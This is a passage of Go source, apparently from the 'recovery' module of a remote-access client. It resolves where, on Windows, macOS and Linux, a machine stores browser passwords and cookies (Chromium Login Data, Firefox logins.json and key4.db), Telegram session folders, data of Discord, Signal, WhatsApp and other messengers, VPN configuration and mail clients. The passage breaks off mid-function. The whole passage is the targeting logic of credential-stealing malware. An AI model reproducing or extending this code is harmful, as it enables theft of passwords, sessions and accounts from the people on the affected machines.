package recovery

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

type resolvedSelection struct {
	selection protocol.RecoveryTargetSelection
	label     string
	paths     []string
}

func resolveSelections(selections []protocol.RecoveryTargetSelection) []resolvedSelection {
	resolved := make([]resolvedSelection, 0, len(selections))
	for idx, selection := range selections {
		label := sanitizeComponent(selection.Label)
		if label == "" {
			label = sanitizeComponent(defaultLabelFor(selection.Type))
		}
		if label == "" {
			label = sanitizeComponent(selection.Type)
		}
		if label == "" {
			label = sanitizeComponent(fmtLabelFromIndex(idx))
		}
		paths := filterExisting(resolveSelectionPaths(selection))
		resolved = append(resolved, resolvedSelection{
			selection: selection,
			label:     label,
			paths:     paths,
		})
	}
	return resolved
}

func defaultLabelFor(typ string) string {
	switch typ {
	case "chromium-history":
		return "chromium-history"
	case "chromium-bookmarks":
		return "chromium-bookmarks"
	case "chromium-cookies":
		return "chromium-cookies"
	case "chromium-passwords":
		return "chromium-passwords"
	case "gecko-history":
		return "gecko-history"
	case "gecko-bookmarks":
		return "gecko-bookmarks"
	case "gecko-cookies":
		return "gecko-cookies"
	case "gecko-passwords":
		return "gecko-passwords"
	case "minecraft-saves":
		return "minecraft-saves"
	case "minecraft-config":
		return "minecraft-config"
	case "telegram-session":
		return "telegram-session"
	case "pidgin-data":
		return "pidgin-data"
	case "psi-data":
		return "psi-data"
	case "discord-data":
		return "discord-data"
	case "slack-data":
		return "slack-data"
	case "element-data":
		return "element-data"
	case "icq-data":
		return "icq-data"
	case "signal-data":
		return "signal-data"
	case "viber-data":
		return "viber-data"
	case "whatsapp-data":
		return "whatsapp-data"
	case "skype-data":
		return "skype-data"
	case "tox-data":
		return "tox-data"
	case "nordvpn-data":
		return "nordvpn-data"
	case "openvpn-data":
		return "openvpn-data"
	case "protonvpn-data":
		return "protonvpn-data"
	case "surfshark-data":
		return "surfshark-data"
	case "expressvpn-data":
		return "expressvpn-data"
	case "cyberghost-data":
		return "cyberghost-data"
	case "foxmail-data":
		return "foxmail-data"
	case "mailbird-data":
		return "mailbird-data"
	case "outlook-data":
		return "outlook-data"
	case "thunderbird-data":
		return "thunderbird-data"
	default:
		return "target"
	}
}

func fmtLabelFromIndex(idx int) string {
	return fmt.Sprintf("target-%d", idx+1)
}

func resolveSelectionPaths(selection protocol.RecoveryTargetSelection) []string {
	switch selection.Type {
	case "chromium-history":
		return joinChromiumFile("History")
	case "chromium-bookmarks":
		return joinChromiumFile("Bookmarks")
	case "chromium-cookies":
		return joinChromiumFile("Cookies")
	case "chromium-passwords":
		return joinChromiumFile("Login Data")
	case "gecko-history":
		return joinGeckoPaths("places.sqlite")
	case "gecko-bookmarks":
		paths := joinGeckoPaths("places.sqlite", "bookmarkbackups")
		return paths
	case "gecko-cookies":
		return joinGeckoPaths("cookies.sqlite", "cookies.sqlite-wal", "cookies.sqlite-shm")
	case "gecko-passwords":
		return joinGeckoPaths("logins.json", "logins-backup.json", "key4.db", "key3.db", "signons.sqlite")
	case "minecraft-saves":
		return joinMinecraftPath("saves")
	case "minecraft-config":
		return joinMinecraftPath("config")
	case "telegram-session":
		return telegramSessionPaths()
	case "pidgin-data":
		return pidginDataPaths()
	case "psi-data":
		return psiDataPaths()
	case "discord-data":
		return discordDataPaths()
	case "slack-data":
		return slackDataPaths()
	case "element-data":
		return elementDataPaths()
	case "icq-data":
		return icqDataPaths()
	case "signal-data":
		return signalDataPaths()
	case "viber-data":
		return viberDataPaths()
	case "whatsapp-data":
		return whatsappDataPaths()
	case "skype-data":
		return skypeDataPaths()
	case "tox-data":
		return toxDataPaths()
	case "nordvpn-data":
		return nordVPNDataPaths()
	case "openvpn-data":
		return openVPNDataPaths()
	case "protonvpn-data":
		return protonVPNDataPaths()
	case "surfshark-data":
		return surfsharkDataPaths()
	case "expressvpn-data":
		return expressVPNDataPaths()
	case "cyberghost-data":
		return cyberGhostDataPaths()
	case "foxmail-data":
		return foxmailDataPaths()
	case "mailbird-data":
		return mailbirdDataPaths()
	case "outlook-data":
		return outlookDataPaths()
	case "thunderbird-data":
		return thunderbirdDataPaths()
	case "custom-path":
		paths := make([]string, 0, len(selection.Paths)+1)
		if strings.TrimSpace(selection.Path) != "" {
			paths = append(paths, selection.Path)
		}
		paths = append(paths, selection.Paths...)
		return paths
	default:
		if strings.TrimSpace(selection.Path) != "" {
			return []string{selection.Path}
		}
		return selection.Paths
	}
}

func filterExisting(paths []string) []string {
	seen := make(map[string]struct{})
	filtered := make([]string, 0, len(paths))
	for _, path := range paths {
		if strings.TrimSpace(path) == "" {
			continue
		}
		abs, err := filepath.Abs(path)
		if err != nil {
			continue
		}
		info, err := os.Stat(abs)
		if err != nil || (!info.Mode().IsRegular() && !info.IsDir()) {
			continue
		}
		if _, exists := seen[abs]; exists {
			continue
		}
		seen[abs] = struct{}{}
		filtered = append(filtered, abs)
	}
	sort.Strings(filtered)
	return filtered
}

func sanitizeComponent(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	replacements := []struct {
		from string
		to   string
	}{
		{"\\", "-"},
		{"/", "-"},
		{":", "-"},
		{"..", "-"},
		{" ", "-"},
	}
	for _, repl := range replacements {
		trimmed = strings.ReplaceAll(trimmed, repl.from, repl.to)
	}
	trimmed = strings.Trim(trimmed, "-._")
	if trimmed == "" {
		return ""
	}
	builder := strings.Builder{}
	for _, r := range trimmed {
		switch {
		case r >= 'a' && r <= 'z':
			builder.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			builder.WriteRune(r + ('a' - 'A'))
		case r >= '0' && r <= '9':
			builder.WriteRune(r)
		case r == '-' || r == '_' || r == '.':
			builder.WriteRune(r)
		default:
			builder.WriteRune('-')
		}
	}
	result := builder.String()
	result = strings.Trim(result, "-._")
	for strings.Contains(result, "--") {
		result = strings.ReplaceAll(result, "--", "-")
	}
	return result
}

func joinChromiumFile(name string) []string {
	dirs := chromiumProfileDirs()
	paths := make([]string, 0, len(dirs))
	for _, dir := range dirs {
		paths = append(paths, filepath.Join(dir, name))
	}
	return paths
}

func joinGeckoPaths(names ...string) []string {
	dirs := geckoProfileDirs()
	paths := make([]string, 0, len(dirs)*len(names))
	for _, dir := range dirs {
		for _, name := range names {
			if strings.TrimSpace(name) == "" {
				continue
			}
			paths = append(paths, filepath.Join(dir, name))
		}
	}
	return paths
}

func chromiumProfileDirs() []string {
	home, _ := os.UserHomeDir()
	dirs := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			dirs = append(dirs,
				filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default"),
				filepath.Join(localAppData, "Chromium", "User Data", "Default"),
				filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			dirs = append(dirs,
				filepath.Join(support, "Google", "Chrome", "Default"),
				filepath.Join(support, "Chromium", "Default"),
				filepath.Join(support, "BraveSoftware", "Brave-Browser", "Default"),
			)
		}
	default:
		if home != "" {
			dirs = append(dirs,
				filepath.Join(home, ".config", "google-chrome", "Default"),
				filepath.Join(home, ".config", "chromium", "Default"),
				filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser", "Default"),
			)
		}
	}
	return dirs
}

func joinMinecraftPath(child string) []string {
	roots := minecraftRoots()
	paths := make([]string, 0, len(roots))
	for _, root := range roots {
		paths = append(paths, filepath.Join(root, child))
	}
	return paths
}

func minecraftRoots() []string {
	home, _ := os.UserHomeDir()
	roots := []string{}
	switch runtime.GOOS {
	case "windows":
		if appData := os.Getenv("APPDATA"); appData != "" {
			roots = append(roots, filepath.Join(appData, ".minecraft"))
		}
		if home != "" {
			roots = append(roots, filepath.Join(home, "AppData", "Roaming", ".minecraft"))
		}
	case "darwin":
		if home != "" {
			roots = append(roots, filepath.Join(home, "Library", "Application Support", "minecraft"))
		}
	default:
		if home != "" {
			roots = append(roots, filepath.Join(home, ".minecraft"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			roots = append(roots, filepath.Join(dataHome, "minecraft"))
		}
	}
	return roots
}

func telegramSessionPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		if appData := os.Getenv("APPDATA"); appData != "" {
			paths = append(paths, filepath.Join(appData, "Telegram Desktop", "tdata"))
		}
		if home != "" {
			paths = append(paths, filepath.Join(home, "AppData", "Roaming", "Telegram Desktop", "tdata"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Telegram Desktop", "tdata"))
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".local", "share", "TelegramDesktop", "tdata"))
		}
	}
	return paths
}

func pidginDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, ".purple"),
				filepath.Join(appData, "Pidgin"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "Pidgin"),
				filepath.Join(home, ".purple"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".purple"),
				filepath.Join(home, ".config", "pidgin"),
				filepath.Join(home, ".config", "purple"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "pidgin"))
		}
	}
	return paths
}

func psiDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Psi"),
				filepath.Join(appData, "Psi+"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "Psi"),
				filepath.Join(support, "Psi+"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".psi"),
				filepath.Join(home, ".psi+"),
				filepath.Join(home, ".config", "psi"),
				filepath.Join(home, ".config", "psi+"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths,
				filepath.Join(config, "psi"),
				filepath.Join(config, "psi+"),
			)
		}
	}
	return paths
}

func discordDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Discord"),
				filepath.Join(appData, "discordcanary"),
				filepath.Join(appData, "discordptb"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Discord"),
				filepath.Join(localAppData, "discordcanary"),
				filepath.Join(localAppData, "discordptb"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "discord"),
				filepath.Join(support, "discordcanary"),
				filepath.Join(support, "discordptb"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "discord"),
				filepath.Join(home, ".config", "discordcanary"),
				filepath.Join(home, ".config", "discordptb"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths,
				filepath.Join(config, "discord"),
				filepath.Join(config, "discordcanary"),
				filepath.Join(config, "discordptb"),
			)
		}
	}
	return paths
}

func slackDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Slack"))
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "slack"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Slack"))
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".config", "Slack"))
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "Slack"))
		}
	}
	return paths
}

func elementDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Element"),
				filepath.Join(appData, "Riot"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "Element"),
				filepath.Join(support, "Riot"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "Element"),
				filepath.Join(home, ".config", "Riot"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths,
				filepath.Join(config, "Element"),
				filepath.Join(config, "Riot"),
			)
		}
	}
	return paths
}

func icqDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "ICQ"))
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "ICQ"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "ICQ"))
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "ICQ"),
				filepath.Join(home, ".local", "share", "ICQ"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "ICQ"))
		}
	}
	return paths
}

func signalDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Signal"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Signal"))
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".config", "Signal"))
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "Signal"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "Signal"))
		}
	}
	return paths
}

func viberDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "ViberPC"))
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Viber"),
				filepath.Join(localAppData, "ViberPC"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "Viber"),
				filepath.Join(support, "ViberPC"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".ViberPC"),
				filepath.Join(home, ".config", "Viber"),
				filepath.Join(home, ".config", "ViberPC"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths,
				filepath.Join(config, "Viber"),
				filepath.Join(config, "ViberPC"),
			)
		}
	}
	return paths
}

func whatsappDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "WhatsApp"))
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "WhatsApp"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "WhatsApp"))
		}
	default:
		if home != "" {
			paths = append(paths, filepath.Join(home, ".config", "WhatsApp"))
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "WhatsApp"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "WhatsApp"))
		}
	}
	return paths
}

func skypeDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Skype"),
				filepath.Join(appData, "Microsoft", "Skype for Desktop"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "Packages", "Microsoft.SkypeApp_kzf8qxf38zg5c"))
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "Skype"),
				filepath.Join(support, "Microsoft", "Skype for Desktop"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".Skype"),
				filepath.Join(home, ".config", "skypeforlinux"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "skypeforlinux"))
		}
	}
	return paths
}

func toxDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Tox"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Tox"))
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "tox"),
				filepath.Join(home, ".local", "share", "tox"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "tox"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "tox"))
		}
	}
	return paths
}

func nordVPNDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "NordVPN"),
				filepath.Join(localAppData, "NordVPN", "NordVPN"),
			)
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "NordVPN"))
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths, filepath.Join(programData, "NordVPN"))
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "NordVPN"),
				filepath.Join(home, "Library", "Group Containers", "group.com.nordvpn.osx"),
			)
		}
		paths = append(paths, "/Library/Application Support/NordVPN")
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "NordVPN"),
				filepath.Join(home, ".config", "nordvpn"),
				filepath.Join(home, ".local", "share", "NordVPN"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "nordvpn"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "nordvpn"))
		}
		paths = append(paths,
			"/etc/nordvpn",
			"/var/lib/nordvpn",
		)
	}
	return paths
}

func openVPNDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		programFiles := os.Getenv("ProgramFiles")
		if programFiles != "" {
			paths = append(paths,
				filepath.Join(programFiles, "OpenVPN"),
				filepath.Join(programFiles, "OpenVPN", "config"),
				filepath.Join(programFiles, "OpenVPN Connect"),
			)
		}
		programFilesX86 := os.Getenv("ProgramFiles(x86)")
		if programFilesX86 != "" {
			paths = append(paths,
				filepath.Join(programFilesX86, "OpenVPN"),
				filepath.Join(programFilesX86, "OpenVPN Connect"),
			)
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths,
				filepath.Join(programData, "OpenVPN"),
				filepath.Join(programData, "OpenVPN Connect"),
			)
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "OpenVPN"),
				filepath.Join(appData, "OpenVPN Connect"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "OpenVPN"),
				filepath.Join(support, "OpenVPN Connect"),
			)
		}
		paths = append(paths,
			"/Library/Application Support/OpenVPN",
			"/Library/Application Support/OpenVPN Connect",
		)
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "OpenVPN"),
				filepath.Join(home, ".config", "openvpn"),
				filepath.Join(home, ".local", "share", "OpenVPN"),
				filepath.Join(home, "OpenVPN"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "openvpn"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "openvpn"))
		}
		paths = append(paths,
			"/etc/openvpn",
			"/etc/openvpn3",
		)
	}
	return paths
}

func protonVPNDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "ProtonVPN"))
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "ProtonVPN"))
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths, filepath.Join(programData, "ProtonVPN"))
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "ProtonVPN"),
				filepath.Join(support, "Proton Technologies AG", "ProtonVPN"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "protonvpn"),
				filepath.Join(home, ".cache", "protonvpn"),
				filepath.Join(home, ".local", "share", "protonvpn"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "protonvpn"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "protonvpn"))
		}
		paths = append(paths,
			"/etc/protonvpn",
			"/var/lib/protonvpn",
		)
	}
	return paths
}

func surfsharkDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "Surfshark"))
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "Surfshark"))
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths, filepath.Join(programData, "Surfshark"))
		}
	case "darwin":
		if home != "" {
			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Surfshark"))
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "surfshark"),
				filepath.Join(home, ".local", "share", "surfshark"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "surfshark"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "surfshark"))
		}
		paths = append(paths, "/etc/surfshark")
	}
	return paths
}

func expressVPNDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, "ExpressVPN"))
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths, filepath.Join(appData, "ExpressVPN"))
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths, filepath.Join(programData, "ExpressVPN"))
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "ExpressVPN"),
				filepath.Join(home, "Library", "Preferences", "com.expressvpn.ExpressVPN.plist"),
			)
		}
		paths = append(paths, "/Library/Application Support/ExpressVPN")
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "expressvpn"),
				filepath.Join(home, ".local", "share", "expressvpn"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths, filepath.Join(config, "expressvpn"))
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "expressvpn"))
		}
		paths = append(paths, "/etc/expressvpn")
	}
	return paths
}

func cyberGhostDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "CyberGhost"),
				filepath.Join(localAppData, "CyberGhostVPN"),
			)
		}
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "CyberGhost"),
				filepath.Join(appData, "CyberGhostVPN"),
			)
		}
		programData := os.Getenv("PROGRAMDATA")
		if programData != "" {
			paths = append(paths,
				filepath.Join(programData, "CyberGhost"),
				filepath.Join(programData, "CyberGhost 8"),
				filepath.Join(programData, "CyberGhostVPN"),
			)
		}
	case "darwin":
		if home != "" {
			support := filepath.Join(home, "Library", "Application Support")
			paths = append(paths,
				filepath.Join(support, "CyberGhost"),
				filepath.Join(support, "CyberGhostVPN"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".config", "cyberghost"),
				filepath.Join(home, ".config", "cyberghostvpn"),
				filepath.Join(home, ".local", "share", "cyberghostvpn"),
			)
		}
		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
			paths = append(paths,
				filepath.Join(config, "cyberghost"),
				filepath.Join(config, "cyberghostvpn"),
			)
		}
		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
			paths = append(paths, filepath.Join(dataHome, "cyberghostvpn"))
		}
		paths = append(paths, "/etc/cyberghost")
	}
	return paths
}

func foxmailDataPaths() []string {
	home, _ := os.UserHomeDir()
	paths := []string{}
	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			paths = append(paths,
				filepath.Join(appData, "Foxmail"),
				filepath.Join(appData, "Foxmail7"),
			)
		}
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData == "" && home != "" {
			localAppData = filepath.Join(home, "AppData", "Local")
		}
		if localAppData != "" {
			paths = append(paths,
				filepath.Join(localAppData, "Foxmail"),
				filepath.Join(localAppData, "Foxmail7"),
			)
		}
	default:
		if home != "" {
			paths = append(paths,
				filepath.Join(home, ".foxmail"),
				filepath.Join(home, "Foxmail"),
			)
		}
